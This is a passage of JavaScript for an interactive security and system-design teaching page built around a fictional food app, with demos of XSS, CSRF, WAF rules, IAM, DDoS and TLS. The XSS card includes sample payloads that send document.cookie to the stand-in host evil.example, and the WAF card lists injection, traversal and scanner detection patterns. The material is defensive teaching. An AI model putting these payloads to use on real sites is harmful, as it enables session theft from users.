    h('div',{class:'ctrls'},P('Honest review','Best biryani in Vizag, arrived hot!'),P('Image onerror','<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">Great food'),P('Script tag','<script>location="https://evil.example/?c="+document.cookie<\/script>'),P('javascript: link','<a href="javascript:stealSession()">Click for a free coupon</a>')),
    ta,h('div',{class:'sm dim'},'HTML the server sends'),srcEl,h('div',{class:'sm dim'},'What the page displays'),seen,res,
    h('div',{class:'sm dim'},'CSP is the safety net: Content-Security-Policy: default-src \'self\'; script-src \'self\' blocks inline handlers. This demo only parses the review in an inert document, nothing here actually runs.'));
  ta.value='<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">Great food';run();
});

card('sec','csrf','Cross-site request forgery (CSRF)',['CSRF'],
'Asha is logged in to FoodRush. She opens another tab with a coupon site, whose hidden form posts to FoodRush. Her browser attaches her session cookie automatically.',
body=>{
  let ss=false,tk=false,og=false;
  const pre=h('pre',{class:'code'}),R=receipt(),v=h('div',{class:'bigstate'},'READY');
  const preview=()=>{
    pre.textContent='POST /account/email HTTP/1.1\nHost: foodrush.in\nOrigin: https://evil-coupons.example\n'+(ss?'(cookie not attached: SameSite=Lax skips cross-site POSTs)':'Cookie: session=9f2c…  ← added by the browser on its own')+'\nContent-Type: application/x-www-form-urlencoded\n\nemail=attacker@evil.example'+(tk?'':'   (no csrf_token field, the attacker cannot know it)');
  };
  const attack=()=>{
    let msg,cls;
    if(ss){msg='401 Unauthorized. The browser sent no session cookie on a cross-site POST.';cls='good'}
    else if(tk){msg='403 Forbidden. The request has no valid CSRF token, which only FoodRush’s own pages know.';cls='good'}
    else if(og){msg='403 Forbidden. Origin is evil-coupons.example, not foodrush.in.';cls='good'}
    else{msg='200 OK. Account email changed to attacker@evil.example. The attacker can now reset the password.';cls='bad'}
    R.add('evil-coupons.example → '+msg,cls==='bad'?'err':'ok');v.textContent=cls==='bad'?'ACCOUNT TAKEN OVER':'ATTACK STOPPED';v.className='bigstate '+cls;
  };
  const legit=()=>{R.add('foodrush.in settings page → 200 OK. Same-site request with its own token and origin.','ok');v.textContent='LEGITIMATE REQUEST ALLOWED';v.className='bigstate good'};
  body.append(
    h('div',{class:'ctrls'},toggle('Cookie is SameSite=Lax',false,x=>{ss=x;preview()}),toggle('Require a CSRF token',false,x=>{tk=x;preview()}),toggle('Check the Origin header',false,x=>{og=x;preview()})),
    h('div',{class:'ctrls'},btn('Visit evil-coupons.example',attack,'bad'),btn('Change email from foodrush.in',legit)),
    pre,v,R.el,h('div',{class:'sm dim'},'Any one of the three defenses stops this attack. Real apps stack them.'));
  preview();
});

card('sec','secrets','Secrets management',['Secrets Management'],
'The Stripe live key can spend real money. Where it lives decides what a leaked repo, a rotation, or an audit looks like.',
body=>{
  let mode='repo';
  const PROPS=['Visible to anyone who can read the repo','Exposed if the repo goes public','Rotates without a redeploy','Every access is audited','Per-service permissions'];
  const MAT={repo:[1,1,0,0,0],env:[0,0,0,0,.5],vault:[0,0,1,1,1]};
  const BADIS=[1,1,0,0,0];
  const SNIP={repo:'const stripe = new Stripe("sk_live_51Hx…9fQ");',env:'const stripe = new Stripe(process.env.STRIPE_KEY);',vault:'const key = await secrets.get("stripe/prod");\nconst stripe = new Stripe(key);'};
  const pre=h('pre',{class:'code'}),tbl=h('div',{class:'steps'}),R=receipt();
  const paint=()=>{
    pre.textContent=SNIP[mode];
    tbl.replaceChildren(...PROPS.map((p,i)=>{
      const val=MAT[mode][i],bad=BADIS[i]?val===1:val===0;
      return h('div',{class:'step '+(val===.5?'run':bad?'bad':'ok')},h('span',{class:'dot'},val===.5?'~':bad?'✗':'✓'),h('div',null,p,' ',pill(val===.5?'partly':val?'yes':'no',val===.5?'warn':bad?'bad':'good')));
    }));
  };
  const push=()=>{
    if(mode==='repo')R.add('Pushed to a public repo. Scanners find sk_live_… within minutes. Deleting the file does not help: it stays in git history. The key must be revoked.','err');
    else if(mode==='env')R.add('The .env file is in .gitignore, so nothing leaked. If it had been committed by mistake, this would be the same as hard-coding.','ok');
    else R.add('The repo only contains the name "stripe/prod", never the value. Nothing to leak.','ok');
  };
  const rotate=()=>{
    if(mode==='repo')R.add('Edit code, open a PR, review, deploy. Until then the old key still works, and it stays in git history forever.','warn');
    else if(mode==='env')R.add('Update the variable in the host dashboard, then restart every instance. No record of who changed it.','warn');
    else R.add('New version stored, apps fetch it within minutes, the old version is disabled. The audit log shows who rotated it and when.','ok');
  };
  body.append(
    h('div',{class:'ctrls'},seg([['repo','Hard-coded in the repo'],['env','.env on the server'],['vault','Secrets manager']],mode,v=>{mode=v;paint()}),btn('Push to a public repo',push,'bad'),btn('Rotate the key',rotate)),
    pre,tbl,R.el);
  paint();
});

card('sec','iam','IAM and least privilege',['IAM'],
'Every service gets its own identity and only the permissions its job needs. Access is denied unless a rule allows it, so a stolen credential has a small blast radius.',
body=>{
  const PERMS=['orders-db:read','orders-db:write','receipts:read','receipts:write','stripe-key:read','queue:publish'];
  const PR=['orders-api','payments-worker','analytics-job','support-intern'];
  const BASE={'orders-api':['orders-db:read','orders-db:write','queue:publish'],'payments-worker':['orders-db:read','stripe-key:read'],'analytics-job':['orders-db:read','receipts:read'],'support-intern':['orders-db:read']};
  const cur={};PR.forEach(p=>{cur[p]=new Set(BASE[p])});
  const boxes={},R=receipt(),audit=h('div',{class:'steps'});
  const pSel=h('select',{id:uid('s'),class:'inp','aria-label':'Identity'},PR.map(p=>h('option',{value:p},p))),aSel=h('select',{id:uid('s'),class:'inp','aria-label':'Action'},PERMS.map(p=>h('option',{value:p},p)));
  const doAudit=()=>{
    const rows=[];
    PR.forEach(p=>{
      const extra=[...cur[p]].filter(x=>!BASE[p].includes(x)),miss=BASE[p].filter(x=>!cur[p].has(x));
      if(extra.length)rows.push(h('div',{class:'step bad'},h('span',{class:'dot'},'✗'),h('div',null,h('b',null,p),' has extra access: '+extra.join(', ')+'. A stolen credential gets all of it.')));
      if(miss.length)rows.push(h('div',{class:'step run'},h('span',{class:'dot'},'!'),h('div',null,h('b',null,p),' is missing '+miss.join(', ')+' and its job will fail.')));
    });
    audit.replaceChildren(...(rows.length?rows:[h('div',{class:'step ok'},h('span',{class:'dot'},'✓'),h('div',null,'Every identity has exactly the permissions it needs.'))]));
  };
  const rowsEl=PR.map(p=>h('tr',null,h('th',null,p),PERMS.map(perm=>{
    const cb=h('input',{type:'checkbox',id:uid('p'),'aria-label':p+' '+perm,onchange:e=>{e.target.checked?cur[p].add(perm):cur[p].delete(perm);doAudit()}});
    cb.checked=cur[p].has(perm);boxes[p+'|'+perm]=cb;return h('td',null,cb);
  })));
  const sync=()=>PR.forEach(p=>PERMS.forEach(perm=>{boxes[p+'|'+perm].checked=cur[p].has(perm)}));
  const check=()=>{const p=pSel.value,a=aSel.value,ok=cur[p].has(a);R.add(p+' → '+a+': '+(ok?'ALLOW (matched a rule)':'DENY (no rule allows it, default deny)'),ok?'ok':'err')};
  body.append(
    h('div',{class:'scroll'},h('table',{class:'tbl'},h('thead',null,h('tr',null,h('th',null,'Identity'),PERMS.map(p=>h('th',null,p)))),h('tbody',null,rowsEl))),
    h('div',{class:'ctrls'},btn('Give support-intern everything (*:*)',()=>{PERMS.forEach(p=>cur['support-intern'].add(p));sync();doAudit();R.add('support-intern now has *:*. One phished intern account could read the Stripe key.','err')},'bad'),btn('Reset to least privilege',()=>{PR.forEach(p=>{cur[p]=new Set(BASE[p])});sync();doAudit();R.add('Policies reset.','dim')})),
    h('div',{class:'ctrls'},pSel,aSel,btn('Check access',check,'pri')),audit,R.el);
  doAudit();
});

card('sec','waf','Web application firewall',['WAF'],
'A WAF sits in front of the app and inspects each request against rules. It blocks known attack shapes before they reach your code, as one layer among several.',
body=>{
  const RULES=[
    {n:'SQL injection',on:true,t:r=>/(\bunion\b[\s\S]*\bselect\b|'\s*or\s+'?\d|--\s*$|;\s*drop\b)/i.test(r.txt)},
    {n:'Cross-site scripting',on:true,t:r=>/(<script|onerror\s*=|javascript:)/i.test(r.txt)},
    {n:'Path traversal',on:true,t:r=>/(\.\.\/|%2e%2e)/i.test(r.txt)},
    {n:'Known attack tools',on:true,t:r=>/(sqlmap|nikto|masscan)/i.test(r.ua)},
    {n:'Oversized body',on:true,t:r=>r.body.length>10000}
  ];
  const REQ=[
    ['Normal search','GET','/menu?q=biryani','Mozilla/5.0',''],
    ['SQL injection','GET',"/menu?q=' OR 1=1--",'Mozilla/5.0',''],
    ['Script in a review','POST','/reviews','Mozilla/5.0','{"text":"<script>steal()<\/script>"}'],
    ['Path traversal','GET','/files/../../etc/passwd','Mozilla/5.0',''],
    ['Scanner','GET','/','sqlmap/1.7','' ],
    ['20 KB body','POST','/orders','Mozilla/5.0','a'.repeat(20000)]
  ];
  let block=true,ok=0,bl=0,fl=0;const R=receipt(),sA=stat('Allowed',0,'good'),sB=stat('Blocked',0,'bad'),sF=stat('Flagged only',0,'warn');
  const send=q=>{
    let path=q[2];try{path=decodeURIComponent(q[2])}catch(e){}
    const r={txt:path+' '+q[4],ua:q[3],body:q[4]},hit=RULES.filter(x=>x.on&&x.t(r));
    const line=q[1]+' '+q[2].slice(0,40)+(q[2].length>40?'…':'');
    if(!hit.length){ok++;R.add(line+' → allowed','ok')}
    else if(block){bl++;R.add(line+' → 403 blocked by rule "'+hit[0].n+'"','err')}
    else{fl++;R.add(line+' → allowed but flagged by "'+hit[0].n+'" (count mode)','warn')}
    sA.set(ok);sB.set(bl);sF.set(fl);
  };
  body.append(
    h('div',{class:'ctrls'},seg([['block','Block matching requests'],['count','Count only (monitor)']],'block',v=>{block=v==='block'})),
    h('div',{class:'ctrls'},RULES.map(r=>toggle(r.n,true,v=>{r.on=v}))),
    h('div',{class:'ctrls'},REQ.map(q=>btn(q[0],()=>send(q)))),
    h('div',{class:'stats'},sA,sB,sF),R.el,
    h('div',{class:'sm dim'},'Start in count mode on a new rule to find false positives before blocking real customers. A WAF reduces noise, it does not replace fixing the bug.'));
});

card('sec','ddos','DDoS protection',['DDoS Protection'],
'A flood of 50,000 requests per second hits an origin that can serve 1,000. Each layer of defense absorbs a share before it reaches your servers.',
body=>{
  let atk=0,attacking=false;const D={cdn:false,rl:false,ch:false,auto:false},inc=[],org=[];
  const chart=h('div',{class:'chart'}),badge=h('div',{class:'bigstate good'},'ORIGIN HEALTHY'),sI=stat('Incoming','–'),sO=stat('Reaching origin','–'),sL=stat('Real customers served','100%','good');
  const W=300,H=120,ly=v=>Math.log10(v+1)/Math.log10(60000);
  const line=(arr,color)=>'<polyline fill="none" stroke="'+color+'" stroke-width="2" vector-effect="non-scaling-stroke" points="'+arr.map((v,i)=>(i/59*W).toFixed(1)+','+(H-ly(v)*H).toFixed(1)).join(' ')+'"/>';
  const draw=cap=>{
    const grid=[100,1000,10000].map(v=>'<line x1="0" x2="'+W+'" y1="'+(H-ly(v)*H).toFixed(1)+'" y2="'+(H-ly(v)*H).toFixed(1)+'" stroke="var(--line)" stroke-width="1"/>').join('');
    const capL='<line x1="0" x2="'+W+'" y1="'+(H-ly(cap)*H).toFixed(1)+'" y2="'+(H-ly(cap)*H).toFixed(1)+'" stroke="var(--warn)" stroke-width="1.5" stroke-dasharray="5 4"/>';
    chart.innerHTML='<svg viewBox="0 0 '+W+' '+H+'" preserveAspectRatio="none" class="spark tallsvg" aria-hidden="true">'+grid+capL+line(inc,'var(--muted)')+line(org,'var(--accent)')+'</svg>';
  };
  const tick=()=>{
    const legit=200+ri(-20,20);
    atk=attacking?Math.min(50000,atk*1.7+400):(atk>20?atk*.35:0);
    const eff=atk*(D.cdn?.15:1)*(D.rl?.4:1)*(D.ch?.1:1),origin=legit+eff,cap=D.auto?4000:1000,frac=Math.min(1,cap/origin);
    inc.push(legit+atk);org.push(origin);while(inc.length<60){inc.unshift(0);org.unshift(0)}while(inc.length>60){inc.shift();org.shift()}
    sI.set(Math.round(legit+atk).toLocaleString('en-IN')+' /s');sO.set(Math.round(origin).toLocaleString('en-IN')+' /s',origin>cap?'bad':'good');
    const pct=Math.round(frac*100);sL.set(pct+'%',pct>=99?'good':pct>=50?'warn':'bad');
    badge.textContent=frac>=.99?'ORIGIN HEALTHY':frac>=.5?'ORIGIN DEGRADED':'ORIGIN DOWN';badge.className='bigstate '+(frac>=.99?'good':frac>=.5?'warn':'bad');
    draw(cap);
  };
  const atkT=toggle('Attack in progress (50,000 req/s)',false,v=>{attacking=v});
  body.append(
    h('div',{class:'ctrls'},atkT),
    h('div',{class:'ctrls'},toggle('CDN and anycast absorb traffic',false,v=>{D.cdn=v}),toggle('Per-IP rate limits',false,v=>{D.rl=v}),toggle('Bot challenge (JS or CAPTCHA)',false,v=>{D.ch=v}),toggle('Autoscale origin to 4× capacity',false,v=>{D.auto=v})),
    chart,h('div',{class:'legend'},pill('incoming',''),pill('reaching origin','info'),pill('origin capacity (dashed)','warn')),badge,h('div',{class:'stats'},sI,sO,sL),
    h('div',{class:'sm dim'},'The chart is logarithmic: each gridline is 10× the one below. Turn defenses on during the attack and watch the accent line fall under the dashed capacity line.'));
  tick();live(body,500,tick);
});

card('sec','tls','TLS handshake and certificate checks',['TLS'],
'Before any order data moves, the browser and server agree on keys and the browser checks the server really is api.foodrush.in. One bad certificate stops everything.',
body=>{
  let fault='none',busy=false;
  const ST=[
    ['1. ClientHello','Browser → server: supported TLS versions and ciphers, a key share (X25519), and the name it wants, api.foodrush.in.'],
    ['2. ServerHello','Server → browser: picks TLS 1.3 and TLS_AES_256_GCM_SHA384, sends its key share. Both sides can now derive the session keys.'],
    ['3. Certificate','Server sends its certificate chain, issued by a public CA.'],
    ['4. Verify certificate','Browser checks the name, the dates, and that a trusted CA signed it.'],
    ['5. Finished','Both sides send a MAC over the whole handshake. A man in the middle that changed anything would be caught here.'],
    ['6. Encrypted application data','Orders now travel encrypted with AES-256-GCM. HSTS tells the browser never to try plain HTTP again.']
  ];
  const ERR={expired:['NET::ERR_CERT_DATE_INVALID','The certificate expired yesterday.'],hostname:['NET::ERR_CERT_COMMON_NAME_INVALID','The certificate is for api.foodrush.io, not api.foodrush.in.'],self:['NET::ERR_CERT_AUTHORITY_INVALID','The certificate is self-signed and no trusted CA vouches for it.']};
  const R=receipt(),li=ST.map(s=>h('li',{class:'step'},h('span',{class:'dot'},'·'),h('div',null,h('b',null,s[0]),h('div',{class:'sm dim'},'waiting'))));
  const setStep=(i,st,t)=>{li[i].className='step '+st;li[i].firstChild.textContent=({ok:'✓',bad:'✗',run:'…'})[st]||'·';li[i].lastChild.lastChild.textContent=t};
  const run=async()=>{
    if(busy)return;busy=true;R.clear();li.forEach((_,i)=>setStep(i,'','waiting'));
    for(let i=0;i<ST.length;i++){
      setStep(i,'run','in progress…');await sleep(450);
      if(i===1&&fault==='old'){setStep(i,'bad','Server only speaks TLS 1.0, which is broken. The browser refuses to downgrade.');R.add('Connection refused: ERR_SSL_VERSION_OR_CIPHER_MISMATCH. No order data was sent.','err');busy=false;return}
      if(i===3&&ERR[fault]){setStep(i,'bad',ERR[fault][1]);R.add('Browser shows a full-page warning: '+ERR[fault][0]+'. The connection is dropped before anything is sent.','err');busy=false;return}
      setStep(i,'ok',ST[i][1]);
    }
    R.add('Secure connection established in 1 round trip. Padlock shown.','ok');busy=false;
  };
  body.append(
    h('div',{class:'ctrls'},seg([['none','Healthy server'],['expired','Expired certificate'],['hostname','Wrong hostname'],['self','Self-signed certificate'],['old','Only TLS 1.0']],fault,v=>{fault=v}),btn('Connect to api.foodrush.in',run,'pri')),
    h('ol',{class:'steps'},li),R.el);
});

/* ===== live mode: run selected cards against the real FoodRush server ===== */
const LIVE={on:false,token:null,session:Math.random().toString(36).slice(2,12)+'lab'};
const LIVE_PANELS={};
const liveListeners=[];

async function lapi(path,opts={}){
  const r=await fetch('/api/lab'+path,{...opts,headers:{'Content-Type':'application/json','Authorization':'Bearer '+LIVE.token,'X-Lab-Session':LIVE.session,...(opts.headers||{})}});
  const data=await r.json().catch(()=>({}));
  if(r.status===401){LIVE.on=false;liveListeners.forEach(f=>f())}
  return {status:r.status,headers:r.headers,data};
}

function realBox(body,build){
  const inner=h('div',{class:'realbody'});
  const box=h('details',{class:'real',hidden:!LIVE.on},h('summary',null,'Run it on your real server ',pill('live','good')),inner);
  let built=false;
  const sync=()=>{box.hidden=!LIVE.on;if(LIVE.on&&!built){built=true;try{build(inner)}catch(e){inner.append('Could not start: '+e.message)}}};
  liveListeners.push(sync);
  body.append(box);
}
const lerr=(R,r)=>R.add('HTTP '+r.status+': '+((r.data&&r.data.error)||'request failed'),'err');

async function probeLive(){
  try{
    const r=await fetch('/api/lab/status',{headers:{Accept:'application/json'}});
    const ct=r.headers.get('content-type')||'';
    if(!ct.includes('json'))return 'none';
    return r.status===401?'login':'disabled';
  }catch(e){return 'none'}
}

async function buildConnect(){
  const sec=$('#connect');
  const mode=await probeLive();
  if(mode==='none')return;                 // opened as a plain file or hosted somewhere without the backend
  sec.hidden=false;
  const R=receipt(20),info=h('div',{class:'stats'}),
    email=h('input',{type:'email',id:'lab-email',class:'inp','aria-label':'Admin email',autocomplete:'username',placeholder:'admin email'}),
    pw=h('input',{type:'password',id:'lab-pw',class:'inp','aria-label':'Admin password',autocomplete:'current-password',placeholder:'admin password'});
  const form=h('div',{class:'ctrls'},h('label',{class:'fld',for:'lab-email'},h('span',null,'Admin email'),email),h('label',{class:'fld',for:'lab-pw'},h('span',null,'Admin password'),pw),btn('Connect',async()=>{
    R.clear();
    try{
      const lr=await fetch('/api/auth/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:email.value,password:pw.value})});
      const ld=await lr.json();
      if(!lr.ok)return R.add(ld.error||'Login failed','err');
      LIVE.token=ld.token;
      const s=await lapi('/status');
      if(s.status===403)return R.add('This account is not an admin. Use the account you created with npm run seed.','err');
      if(s.status===404)return R.add('Lab is switched off on the server. Add LAB_ENABLED=true to .env and restart.','err');
      if(s.status!==200)return lerr(R,s);
      pw.value='';LIVE.on=true;showStatus(s.data);liveListeners.forEach(f=>f());
      R.add('Connected. Open "Run it on your real server" inside a card.','ok');
    }catch(e){R.add('Could not reach the server: '+e.message,'err')}
  },'pri'));
  const showStatus=d=>{
    info.replaceChildren(
      stat('Database',d.db.state+(d.db.pingMs!=null?' · '+d.db.pingMs+' ms':''),d.db.state==='connected'?'good':'bad'),
      stat('Stripe mode',d.stripe.mode+' · '+d.stripe.currency.toUpperCase(),d.stripe.mode==='live'?'warn':'good'),
      stat('Webhook secret',d.stripe.webhookConfigured?'set':'missing',d.stripe.webhookConfigured?'good':'bad'),
      stat('Connection pool','up to '+d.db.poolMax),
      stat('Server',d.node+' · up '+d.uptimeSeconds+' s · '+d.rssMb+' MB'));
    const rows=Object.entries(d.limits).map(([k,v])=>h('tr',null,h('th',null,k),h('td',{class:'left'},v)));
    info.after(h('div',{class:'scroll'},h('table',{class:'tbl'},h('tbody',null,rows))));
  };
  liveListeners.push(()=>{if(!LIVE.on)R.add('Session expired. Connect again.','warn')});
  sec.append(
    h('div',{class:'index-h'},h('h2',{id:'ch'},'Connected mode'),h('span',{class:'dim sm'},'Your server is running this page')),
    h('p',{class:'dim sm'},mode==='disabled'?'The lab endpoints are switched off. Add LAB_ENABLED=true to .env and restart to use them.':'Sign in with your admin account to run cards against your real database. Each card gets a “Run it on your real server” section. These tests write only to scratch collections, never to real orders or menu.'),
    mode==='disabled'?null:form,R.el,info);
}

/* ---- panels ---- */
LIVE_PANELS.rate=b=>{
  let cap=8,rate=2,ok=0,no=0;const R=receipt(),sO=stat('Allowed',0,'good'),sN=stat('Rejected 429',0,'bad');
  const one=async()=>{
    const r=await lapi('/ping?cap='+cap+'&rate='+rate);
    if(r.status===200){ok++;R.add('GET /api/lab/ping → 200 · tokens left '+r.data.tokens,'ok')}
    else if(r.status===429){no++;R.add('GET /api/lab/ping → 429 · Retry-After: '+r.headers.get('retry-after')+' s · '+r.data.retryAfterSeconds+' s exactly','err')}
    else lerr(R,r);
    sO.set(ok);sN.set(no);
  };
  b.append(h('div',{class:'ctrls'},btn('Send real request',one,'pri'),btn('Burst ×10',()=>Promise.all(Array.from({length:10},one)))),
    h('div',{class:'ctrls'},range('Bucket size',1,20,1,cap,v=>{cap=v}),range('Refill per second',1,10,1,rate,v=>{rate=v},v=>v+'/s')),
    h('div',{class:'stats'},sO,sN),R.el);
};

LIVE_PANELS.idem=b=>{
  let useKey=true,key=hex(8)+'-'+hex(4);const R=receipt(),sD=stat('Charge records in MongoDB',0);
  const refresh=async()=>{const r=await lapi('/charges');if(r.status===200)sD.set(r.data.count,r.data.count>1?'bad':'good')};
  const pay=async why=>{
    const r=await lapi('/charge',{method:'POST',headers:useKey?{'Idempotency-Key':key}:{}});
    if(r.status===200||r.status===201)R.add(why+': '+(r.data.replayed?'replayed '+r.data.chargeId+', no new charge':'created '+r.data.chargeId),r.data.replayed?'ok':(useKey?'ok':'err'));else lerr(R,r);
  };
  b.append(h('div',{class:'ctrls'},toggle('Send an Idempotency-Key',true,v=>{useKey=v}),btn('Pay',async()=>{await pay('Tap');refresh()},'pri'),btn('Double tap (2 at once)',async()=>{await Promise.all([pay('Tap A'),pay('Tap B')]);refresh()}),btn('New order',()=>{key=hex(8)+'-'+hex(4);R.add('— new order, new key —','dim')}),btn('Clear',async()=>{await lapi('/charges',{method:'DELETE'});R.clear();refresh()})),
    h('div',{class:'stats'},sD),R.el,h('div',{class:'sm dim'},'The two simultaneous taps race for a unique index in MongoDB. Exactly one insert wins.'));
  refresh();
};

LIVE_PANELS.validate=b=>{
  const ta=h('textarea',{id:uid('t'),class:'ta',rows:8,spellcheck:'false','aria-label':'Request body'}),out=h('div',{class:'steps'}),v=h('div',{class:'bigstate'},'');
  const P={good:{items:[{sku:'BIRYANI-01',qty:2}],address:'12-4-7 Beach Road, Visakhapatnam'},qty:{items:[{sku:'BIRYANI-01',qty:-3}],address:'12-4-7 Beach Road, Visakhapatnam'},price:{items:[{sku:'BIRYANI-01',qty:1}],address:'12-4-7 Beach Road, Visakhapatnam',total:1},nested:{items:[{sku:'BIRYANI-01',qty:1,price:1}],address:'x'}};
  let t=null,seq=0;
  const run=async()=>{
    let body;try{body=JSON.parse(ta.value)}catch(e){v.textContent='Not valid JSON';v.className='bigstate bad';out.replaceChildren();return}
    const my=++seq,r=await lapi('/validate',{method:'POST',body:JSON.stringify(body)});if(my!==seq)return;
    if(r.status===200){v.textContent='Server says: valid';v.className='bigstate good';out.replaceChildren()}
    else{v.textContent='Server says: 422 · '+(r.data.issues||[]).length+' problem(s)';v.className='bigstate bad';out.replaceChildren(...(r.data.issues||[]).map(i=>h('div',{class:'step bad'},h('span',{class:'dot'},'✗'),h('div',null,h('code',null,i.path),' ',i.message))))}
  };
  const load=k=>{ta.value=JSON.stringify(P[k],null,2);run()};
  ta.addEventListener('input',()=>{clearTimeout(t);t=setTimeout(run,300)});
  b.append(h('div',{class:'ctrls'},btn('Valid order',()=>load('good')),btn('Negative quantity',()=>load('qty')),btn('Client sets the price',()=>load('price')),btn('Price inside an item',()=>load('nested'))),ta,v,out,h('div',{class:'sm dim'},'This sends your text to the same zod schema that guards POST /api/checkout.'));
  load('good');
};

LIVE_PANELS.locking=b=>{
  let mode='none';const R=receipt(),v=h('div',{class:'bigstate'},'READY'),sC=stat('Orders confirmed','–'),sS=stat('Stock left in MongoDB','–');
  const run=async()=>{
    v.textContent='RUNNING';v.className='bigstate warn';R.clear();
    const r=await lapi('/race',{method:'POST',body:JSON.stringify({mode})});
    if(r.status!==200){lerr(R,r);return}
    r.data.log.sort().forEach(l=>R.add(l,/confirmed/.test(l)?'ok':/conflict|0 rows|waiting|failed|sold/.test(l)?'warn':'dim'));
    const bad=r.data.confirmed>1||r.data.finalStock<0;
    sC.set(r.data.confirmed,bad?'bad':'good');sS.set(r.data.finalStock,r.data.finalStock<0?'bad':'good');
    v.textContent=bad?'OVERSOLD: '+r.data.confirmed+' orders for 1 portion':'CORRECT: 1 order for 1 portion';v.className='bigstate '+(bad?'bad':'good');
  };
  b.append(h('div',{class:'ctrls'},seg([['none','No locking'],['pess','Pessimistic lock'],['opt','Optimistic version'],['atomic','Atomic $inc (used by checkout)']],mode,x=>{mode=x}),btn('Both tap Order at once',run,'pri')),v,h('div',{class:'stats'},sC,sS),R.el,h('div',{class:'sm dim'},'Two real concurrent requests against one document. Timestamps are milliseconds since the race began.'));
};

LIVE_PANELS.nplus1=b=>{
  let n=50;const rows={naive:barRow('Loop per row'),batch:barRow('Batch with $in'),join:barRow('$lookup (JOIN)')},R=receipt();
  const run=async()=>{
    R.clear();R.add('First run builds 20,000 scratch orders if they do not exist yet. Allow a few seconds.','dim');
    const res={};
    for(const m of ['naive','batch','join']){const r=await lapi('/n1',{method:'POST',body:JSON.stringify({mode:m,n})});if(r.status!==200)return lerr(R,r);res[m]=r.data}
    const mx=Math.max(...Object.values(res).map(x=>x.ms));
    for(const m in res){rows[m].set(res[m].ms/mx*100,res[m].queries+' queries · '+res[m].ms+' ms',m==='naive'?'var(--bad)':'var(--good)');R.add(m+': '+res[m].queries+' queries, '+res[m].ms+' ms','ok')}
  };
  b.append(h('div',{class:'ctrls'},range('Orders on the page',5,100,5,n,v=>{n=v}),btn('Run all three',run,'pri')),h('div',{class:'bars'},rows.naive,rows.batch,rows.join),R.el,h('div',{class:'sm dim'},'Times include the network trip to your database, so the loop is slower the farther away it is.'));
};

LIVE_PANELS.index=b=>{
  let ix='none',limit=false;const R=receipt(),bars={none:barRow('No index'),rest:barRow('rid'),comp:barRow('rid, status, createdAt')},info=h('div',{class:'mono sm'},'');
  const one=async i=>{const r=await lapi('/explain',{method:'POST',body:JSON.stringify({index:i,limit})});if(r.status!==200){lerr(R,r);return null}return r.data};
  const all=async()=>{
    R.clear();R.add('First run builds 20,000 scratch orders and two indexes. Allow a few seconds.','dim');
    const res={};
    for(const i of ['none','rest','comp']){res[i]=await one(i);if(!res[i])return}
    const mx=Math.max(...Object.values(res).map(x=>x.docsExamined),1);
    for(const i in res){const x=res[i];bars[i].set(x.docsExamined/mx*100,x.docsExamined.toLocaleString('en-IN')+' docs',x.docsExamined>1000?'var(--bad)':'var(--good)');R.add(i+': '+x.plan+' · examined '+x.docsExamined+' docs, '+x.keysExamined+' keys, returned '+x.returned+', server time '+x.serverMs+' ms',x.docsExamined>1000?'err':'ok')}
  };
  b.append(h('div',{class:'ctrls'},toggle('Add LIMIT 20',false,v=>{limit=v}),btn('Explain all three on my database',all,'pri')),h('div',{class:'bars'},bars.none,bars.rest,bars.comp),R.el,h('div',{class:'sm dim'},'This runs MongoDB’s own explain("executionStats") with each index forced, so the numbers are what your database really did.'));
};

LIVE_PANELS.cache=b=>{
  let ttl=8,hit=0,miss=0;const R=receipt(),sH=stat('Hits',0,'good'),sM=stat('Misses',0,'bad');
  const open=async()=>{
    const r=await lapi('/cache?ttl='+ttl);if(r.status!==200)return lerr(R,r);
    r.data.source==='HIT'?hit++:miss++;
    R.add('GET menu → '+r.data.source+' · '+r.data.ms+' ms · '+r.data.items+' items'+(r.data.source==='HIT'?' · entry expires in '+r.data.ttlLeft+' s':''),r.data.source==='HIT'?'ok':'warn');
    sH.set(hit);sM.set(miss);
  };
  b.append(h('div',{class:'ctrls'},btn('Open menu',open,'pri'),btn('Clear the cache',async()=>{await lapi('/cache',{method:'DELETE'});R.add('cache cleared','dim')}),range('TTL',1,30,1,ttl,v=>{ttl=v},v=>v+' s')),h('div',{class:'stats'},sH,sM),R.el);
};

LIVE_PANELS.probes=b=>{
  const pre=h('pre',{class:'code'},'Press a button.');
  const get=async path=>{
    const t=performance.now();
    try{const r=await fetch(path);const txt=await r.text();pre.textContent='GET '+path+' → '+r.status+' in '+Math.round(performance.now()-t)+' ms\n'+txt}
    catch(e){pre.textContent='GET '+path+' failed: '+e.message}
  };
  b.append(h('div',{class:'ctrls'},btn('GET /healthz (liveness)',()=>get('/healthz'),'pri'),btn('GET /readyz (readiness, pings MongoDB)',()=>get('/readyz'))),pre,h('div',{class:'sm dim'},'To see readiness fail, stop your database connection (for example change MONGODB_URI to a wrong password, restart) and press the second button.'));
};

/* ===== hero, index, nav, boot ===== */
const GROUPS=[
 ['Core infrastructure & architecture',['Rate Limiting','Caching','Load Balancing','Reverse Proxies','API Gateways','CI/CD','Docker','Kubernetes','Service Discovery','Circuit Breakers','Timeouts','Retries','Exponential Backoff','Idempotency','Message Queues','Pub/Sub','Event-Driven Architecture','Distributed Transactions','Saga Pattern','Dead Letter Queues']],
 ['Databases & performance',['N+1 Queries','Connection Pooling','Read Replicas','WebSockets','Long Polling','Server-Sent Events','Database Indexing','Query Optimization','CAP Theorem','Eventual Consistency','Optimistic Locking','Pessimistic Locking','Distributed Locks','Partitioning','Replication','Leader Election','Data Validation','Deadlocks']],
 ['Deployments & reliability',['Feature Flags','Blue-Green Deployment','Canary Releases','Rolling Deployments','Health Checks','Liveness & Readiness Probes','Monitoring','Logging','Distributed Tracing','Cache Invalidation','Alerts','SLOs','Error Budgets','Observability']],
 ['Security',['JWT/OAuth','SQL Injection','XSS','CSRF','Secrets Management','IAM','WAF','DDoS Protection','TLS']]
];

const STAGES=[
 ['Edge','TLS · WAF · DDoS','tls','TLS 1.3 handshake done, certificate valid. WAF found nothing. IP is not on the flood list.',9],
 ['Gateway','JWT · rate limit · routing','gateway','JWT verified (role=customer). 1 of 60 requests used this minute. Routed to orders-api.',4],
 ['Orders service','pods · discovery','k8s','Pod orders-api-7d9c4 chosen from the registry. Readiness probe passing.',11],
 ['Payments','idempotency · breaker','idem','Stripe charge of '+inr(649)+' sent with an Idempotency-Key. Circuit breaker closed.',138],
 ['Queue','events · saga','pubsub','order.placed published to kitchen, billing and notifications.',6],
